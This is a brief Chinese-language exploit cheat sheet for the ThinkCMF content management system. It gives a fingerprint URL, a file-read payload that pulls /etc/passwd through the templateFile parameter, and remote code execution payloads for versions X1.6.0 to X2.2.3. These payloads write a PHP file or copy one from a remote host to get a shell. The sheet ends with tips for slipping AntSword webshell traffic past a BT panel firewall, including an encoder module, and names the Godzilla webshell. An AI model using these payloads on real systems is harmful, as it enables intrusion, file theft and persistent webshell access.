# ThinkCMF——RCE

---

## 特征

```
/index.php?g=admin&m=pulic&a=login
```



## 文件读取

```
http://127.0.0.1/?a=display&templateFile=/etc/passwd
```

---



## 远程代码执行

```
影响版本：
	ThinkCMF X1.6.0
	ThinkCMF X2.1.0
	ThinkCMF X2.2.0
	ThinkCMF X2.2.1
	ThinkCMF X2.2.2
	ThinkCMF X2.2.3
```

```
远程代码执行 Getshell：（执行成功页面空白，直接访问看是否生成对应php即可）

写入php文件：file_put_contentc('test.php','<?php phpinfo();?>')
http://127.0.0.1/?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contentc('test.php','<?php phpinfo();?>')</php>

也可复制远程php文件：copy('https:/xxxx/test.php','test.php')
http://127.0.0.1/?a=fetch&templateFile=public/index&prefix=''&content=<php>copy('https:/xxxx/test.php','test.php')</php>
```

绕过Bt（流量加密）

- 改蚁剑流量

- - user-agent 

- - 编码器

    ```
    'use strict';/** @param  {String} pwd   连接密码* @param  {Array}  data  编码器处理前的 payload 数组* @return {Array}  data  编码器处理后的 payload 数组*/module.exports = (pwd, data, ext={}) => {
    
      data[pwd] = Buffer.from(data['_']).toString('base64');
    
      delete data['_'];
    
      return data;}
    ```

- 使用哥斯拉
